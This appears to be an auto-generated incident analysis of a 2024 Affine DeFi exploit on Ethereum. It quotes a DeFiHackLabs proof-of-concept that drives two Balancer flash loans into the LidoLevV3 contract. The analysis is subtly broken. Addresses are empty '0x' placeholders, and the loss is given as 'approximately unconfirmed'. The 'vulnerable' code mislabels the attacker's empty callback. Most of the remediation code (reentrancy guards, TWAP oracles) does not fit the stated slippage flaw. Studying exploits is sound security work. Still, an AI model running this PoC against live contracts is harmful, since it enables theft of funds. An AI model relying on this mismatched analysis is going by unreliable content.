# Affine DeFi — Insufficient Slippage Validation in Strategy Contract Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-05 |
| **Protocol** | Affine DeFi |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Insufficient slippage validation in strategy contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/AffineDeFi_exp.sol) |

---
## 1. Vulnerability Overview

Affine DeFi is a DeFi protocol operating on the Ethereum chain that suffered a **strategy contract vulnerability** attack on 2024-02-05.
The attacker exploited insufficient slippage validation in the strategy contract, causing approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Strategy contract vulnerability
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Insufficient slippage validation in strategy contract
// Attacker exploits this logic to obtain illegitimate gains

// Affine DeFi strategy interface — vulnerable function with insufficient slippage validation
interface IBalancer {
    // ❌ Vulnerable: calling the strategy contract's
    // depositExactAmount inside the flashLoan callback (receiveFlashLoan)
    // allows large deposits without slippage validation
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

// ❌ Vulnerable: Affine strategy deposit — no minimum shares received validation
interface IAffineStrategy {
    function createAaveDebt(uint256 wethAmount) external;
}

// ✅ Correct implementation: enforce minimum shares received validation
function safeDeposit(uint256 assets, address receiver, uint256 minSharesOut) external returns (uint256 shares) {
    // ✅ Calculate expected shares
    shares = previewDeposit(assets);
    // ✅ Slippage protection: reject if below minimum received amount
    require(shares >= minSharesOut, "Deposit: slippage too high");
    // ✅ Block strategy calls during flash loan
    require(!flashLoanActive, "Flash: deposit blocked");
    IERC20(asset).transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── Affine DeFi Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - AffineDeFi_exp.sol
// Chain: Ethereum | Date: 2024-02-05

    function testExploit() external {
        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance before attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );

        bytes memory userencodeData = abi.encode(1, address(this));
        bytes memory userencodeData2 = abi.encode(2, address(this));
        uint256[] memory amount = new uint256[](1);
        uint256[] memory amount2 = new uint256[](1);
        IERC20[] memory token = new IERC20[](1);

        token[0] = IERC20(WETH);
        amount[0] = 318_973_831_042_619_036_856;
        amount2[0] = 0;
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount, userencodeData);
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount2, userencodeData2);

        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance after attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );
    }

    function createAaveDebt(
        uint256 wethAmount
    ) external {
        // do nothing
    }
}

```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Logic vulnerability |
| **Attack Type** | Smart contract bug |
| **Vulnerability Category** | DeFi attack |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable function**: Apply emergency pause to the attacked function
2. **Assess damage**: Classify the scale of lost assets and affected users
3. **Notify relevant parties**: Immediately notify related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-term Improvements
- Conduct **independent security audits** (at least 2 auditing firms)
- Run a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Strategy contract vulnerability attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: Design every function with attacker economic motivation in mind
3. **Audit prioritization**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response manual that can be executed immediately upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-02-05** Affine DeFi incident reconfirms the danger of **strategy contract vulnerability** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Recommend strengthening community-wide security information sharing

---
*This document was created for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/AffineDeFi_exp.sol)*